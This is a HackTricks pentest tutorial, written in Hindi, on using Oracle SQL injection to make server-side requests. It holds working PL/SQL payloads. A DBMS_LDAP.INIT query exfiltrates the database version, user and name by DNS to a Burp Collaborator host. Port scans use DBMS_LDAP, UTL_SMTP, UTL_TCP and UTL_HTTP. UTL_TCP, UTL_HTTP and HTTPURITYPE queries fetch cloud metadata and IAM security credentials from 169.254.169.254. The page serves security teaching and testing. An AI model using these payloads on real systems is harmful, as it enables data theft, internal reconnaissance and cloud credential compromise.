# Oracle injection

{{#include ../../banners/hacktricks-training.md}}

**इस पोस्ट को [https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/](https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/) से हटाए गए पोस्ट की वेबबैक मशीन कॉपी सर्व करें**।

## SSRF

Oracle का उपयोग Out of Band HTTP और DNS अनुरोध करने के लिए अच्छी तरह से प्रलेखित है लेकिन SQL डेटा को एक्सफिल्ट्रेट करने के लिए इंजेक्शन में। हम हमेशा इन तकनीकों/फंक्शंस को अन्य SSRF/XSPA करने के लिए संशोधित कर सकते हैं।

Oracle स्थापित करना वास्तव में दर्दनाक हो सकता है, विशेष रूप से यदि आप कमांड आजमाने के लिए एक त्वरित उदाहरण सेट करना चाहते हैं। मेरे दोस्त और सहयोगी [Appsecco](https://appsecco.com), [Abhisek Datta](https://github.com/abhisek), ने मुझे [https://github.com/MaksymBilenko/docker-oracle-12c](https://github.com/MaksymBilenko/docker-oracle-12c) की ओर इशारा किया जिसने मुझे एक t2.large AWS Ubuntu मशीन और Docker पर एक उदाहरण सेट करने की अनुमति दी।

मैंने `--network="host"` फ्लैग के साथ डॉकर कमांड चलाया ताकि मैं इस ब्लॉगपोस्ट के दौरान Oracle को एक मूल इंस्टॉलेशन के रूप में पूर्ण नेटवर्क एक्सेस के साथ अनुकरण कर सकूं।
```
docker run -d --network="host" quay.io/maksymbilenko/oracle-12c
```
#### Oracle पैकेज जो URL या Hostname/Port Number विनिर्देशन का समर्थन करते हैं <a href="#oracle-packages-that-support-a-url-or-a-hostname-port-number-specification" id="oracle-packages-that-support-a-url-or-a-hostname-port-number-specification"></a>

किसी भी पैकेज और कार्यों को खोजने के लिए जो एक होस्ट और पोर्ट विनिर्देशन का समर्थन करते हैं, मैंने [Oracle Database Online Documentation](https://docs.oracle.com/database/121/index.html) पर एक Google खोज की। विशेष रूप से,
```
site:docs.oracle.com inurl:"/database/121/ARPLS" "host"|"hostname" "port"|"portnum"
```
खोज ने निम्नलिखित परिणाम लौटाए (सभी का उपयोग आउटबाउंड नेटवर्क करने के लिए नहीं किया जा सकता)

- DBMS_NETWORK_ACL_ADMIN
- UTL_SMTP
- DBMS_XDB
- DBMS_SCHEDULER
- DBMS_XDB_CONFIG
- DBMS_AQ
- UTL_MAIL
- DBMS_AQELM
- DBMS_NETWORK_ACL_UTILITY
- DBMS_MGD_ID_UTL
- UTL_TCP
- DBMS_MGWADM
- DBMS_STREAMS_ADM
- UTL_HTTP

यह कच्ची खोज स्पष्ट रूप से ऐसे पैकेजों को छोड़ देती है जैसे `DBMS_LDAP` (जो एक होस्टनाम और पोर्ट नंबर पास करने की अनुमति देता है) क्योंकि [डॉक्यूमेंटेशन पृष्ठ](https://docs.oracle.com/database/121/ARPLS/d_ldap.htm#ARPLS360) आपको बस [एक अलग स्थान](https://docs.oracle.com/database/121/ARPLS/d_ldap.htm#ARPLS360) पर ले जाता है। इसलिए, अन्य Oracle पैकेज हो सकते हैं जिन्हें आउटबाउंड अनुरोध करने के लिए दुरुपयोग किया जा सकता है जिन्हें मैंने छोड़ दिया हो सकता है।

किसी भी मामले में, आइए हम कुछ पैकेजों पर नज़र डालते हैं जिन्हें हमने खोजा और ऊपर सूचीबद्ध किया है।

**DBMS_LDAP.INIT**

`DBMS_LDAP` पैकेज LDAP सर्वरों से डेटा तक पहुँचने की अनुमति देता है। `init()` फ़ंक्शन एक LDAP सर्वर के साथ एक सत्र प्रारंभ करता है और एक होस्टनाम और पोर्ट नंबर को तर्क के रूप में लेता है।

इस फ़ंक्शन को पहले DNS के माध्यम से डेटा के निष्कर्षण को दिखाने के लिए दस्तावेजित किया गया है, जैसे नीचे
```
SELECT DBMS_LDAP.INIT((SELECT version FROM v$instance)||'.'||(SELECT user FROM dual)||'.'||(select name from V$database)||'.'||'d4iqio0n80d5j4yg7mpu6oeif9l09p.burpcollaborator.net',80) FROM dual;
```
हालांकि, यह देखते हुए कि यह फ़ंक्शन एक होस्टनाम और एक पोर्ट नंबर को तर्क के रूप में स्वीकार करता है, आप इसका उपयोग पोर्ट स्कैनर की तरह भी कर सकते हैं।

यहाँ कुछ उदाहरण हैं
```
SELECT DBMS_LDAP.INIT('scanme.nmap.org',22) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',25) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',80) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',8080) FROM dual;
```
`ORA-31203: DBMS_LDAP: PL/SQL - Init Failed.` यह दर्शाता है कि पोर्ट बंद है जबकि एक सत्र मान पोर्ट को खुला दिखाता है।

**UTL_SMTP**

`UTL_SMTP` पैकेज SMTP के माध्यम से ई-मेल भेजने के लिए डिज़ाइन किया गया है। [Oracle दस्तावेज़ साइट पर दिया गया उदाहरण दिखाता है कि आप इस पैकेज का उपयोग करके ई-मेल कैसे भेज सकते हैं](https://docs.oracle.com/database/121/ARPLS/u_smtp.htm#ARPLS71478)। हमारे लिए, हालांकि, दिलचस्प बात यह है कि एक होस्ट और पोर्ट विनिर्देशन प्रदान करने की क्षमता है।

नीचे एक कच्चा उदाहरण दिया गया है जिसमें `UTL_SMTP.OPEN_CONNECTION` फ़ंक्शन है, जिसमें 2 सेकंड का टाइमआउट है।
```
DECLARE c utl_smtp.connection;
BEGIN
c := UTL_SMTP.OPEN_CONNECTION('scanme.nmap.org',80,2);
END;
```

```
DECLARE c utl_smtp.connection;
BEGIN
c := UTL_SMTP.OPEN_CONNECTION('scanme.nmap.org',8080,2);
END;
```
`ORA-29276: transfer timeout` यह दिखाता है कि पोर्ट खुला है लेकिन कोई SMTP कनेक्शन स्थापित नहीं हुआ जबकि `ORA-29278: SMTP transient error: 421 Service not available` यह दिखाता है कि पोर्ट बंद है।

**UTL_TCP**

`UTL_TCP` पैकेज और इसके प्रक्रियाएँ और फ़ंक्शन [सेवाओं के साथ TCP/IP आधारित संचार की अनुमति देते हैं](https://docs.oracle.com/cd/B28359_01/appdev.111/b28419/u_tcp.htm#i1004190)। यदि किसी विशेष सेवा के लिए प्रोग्राम किया गया है, तो यह पैकेज नेटवर्क में प्रवेश करने का एक आसान तरीका बन सकता है या पूर्ण सर्वर साइड अनुरोध कर सकता है क्योंकि TCP/IP कनेक्शन के सभी पहलुओं को नियंत्रित किया जा सकता है।

उदाहरण [Oracle दस्तावेज़ साइट पर दिखाता है कि आप इस पैकेज का उपयोग करके एक कच्चा TCP कनेक्शन कैसे बना सकते हैं ताकि एक वेब पृष्ठ को प्राप्त किया जा सके](https://docs.oracle.com/cd/B28359_01/appdev.111/b28419/u_tcp.htm#i1004190)। हम इसे थोड़ा और सरल बना सकते हैं और इसका उपयोग मेटाडेटा उदाहरण के लिए या किसी मनमाने TCP/IP सेवा के लिए अनुरोध करने के लिए कर सकते हैं।
```
set serveroutput on size 30000;
SET SERVEROUTPUT ON
DECLARE c utl_tcp.connection;
retval pls_integer;
BEGIN
c := utl_tcp.open_connection('169.254.169.254',80,tx_timeout => 2);
retval := utl_tcp.write_line(c, 'GET /latest/meta-data/ HTTP/1.0');
retval := utl_tcp.write_line(c);
BEGIN
LOOP
dbms_output.put_line(utl_tcp.get_line(c, TRUE));
END LOOP;
EXCEPTION
WHEN utl_tcp.end_of_input THEN
NULL;
END;
utl_tcp.close_connection(c);
END;
/
```

```
DECLARE c utl_tcp.connection;
retval pls_integer;
BEGIN
c := utl_tcp.open_connection('scanme.nmap.org',22,tx_timeout => 4);
retval := utl_tcp.write_line(c);
BEGIN
LOOP
dbms_output.put_line(utl_tcp.get_line(c, TRUE));
END LOOP;
EXCEPTION
WHEN utl_tcp.end_of_input THEN
NULL;
END;
utl_tcp.close_connection(c);
END;
```
दिलचस्प बात यह है कि कच्चे TCP अनुरोध बनाने की क्षमता के कारण, इस पैकेज का उपयोग सभी क्लाउड प्रदाताओं के Instance मेटा-डेटा सेवा को क्वेरी करने के लिए भी किया जा सकता है क्योंकि विधि प्रकार और अतिरिक्त हेडर सभी TCP अनुरोध के भीतर पास किए जा सकते हैं।

**UTL_HTTP और वेब अनुरोध**

शायद हर Out of Band Oracle SQL Injection ट्यूटोरियल में सबसे सामान्य और व्यापक रूप से प्रलेखित तकनीक [`UTL_HTTP` पैकेज](https://docs.oracle.com/database/121/ARPLS/u_http.htm#ARPLS070) है। इस पैकेज को प्रलेखन द्वारा इस प्रकार परिभाषित किया गया है - `The UTL_HTTP package makes Hypertext Transfer Protocol (HTTP) callouts from SQL and PL/SQL. You can use it to access data on the Internet over HTTP.`
```
select UTL_HTTP.request('http://169.254.169.254/latest/meta-data/iam/security-credentials/adminrole') from dual;
```
आप इसके साथ कुछ मौलिक पोर्ट स्कैनिंग करने के लिए भी इसका उपयोग कर सकते हैं, जैसे कि प्रश्नों के साथ
```
select UTL_HTTP.request('http://scanme.nmap.org:22') from dual;
select UTL_HTTP.request('http://scanme.nmap.org:8080') from dual;
select UTL_HTTP.request('http://scanme.nmap.org:25') from dual;
```
`ORA-12541: TNS:no listener` या `TNS:operation timed out` यह संकेत है कि TCP पोर्ट बंद है, जबकि `ORA-29263: HTTP protocol error` या डेटा यह संकेत है कि पोर्ट खुला है।

एक और पैकेज जिसका मैंने अतीत में विभिन्न सफलताओं के साथ उपयोग किया है वह है [`GETCLOB()` विधि `HTTPURITYPE` Oracle अमूर्त प्रकार की](https://docs.oracle.com/database/121/ARPLS/t_dburi.htm#ARPLS71705) जो आपको एक URL के साथ इंटरैक्ट करने की अनुमति देती है और HTTP प्रोटोकॉल के लिए समर्थन प्रदान करती है। `GETCLOB()` विधि का उपयोग एक URL से GET प्रतिक्रिया को [CLOB डेटा प्रकार के रूप में](https://docs.oracle.com/javadb/10.10.1.2/ref/rrefclob.html) लाने के लिए किया जाता है। [select HTTPURITYPE('http://169.254.169.254/latest/meta-data/instance-id').getclob() from dual;]

{{#include ../../banners/hacktricks-training.md}}
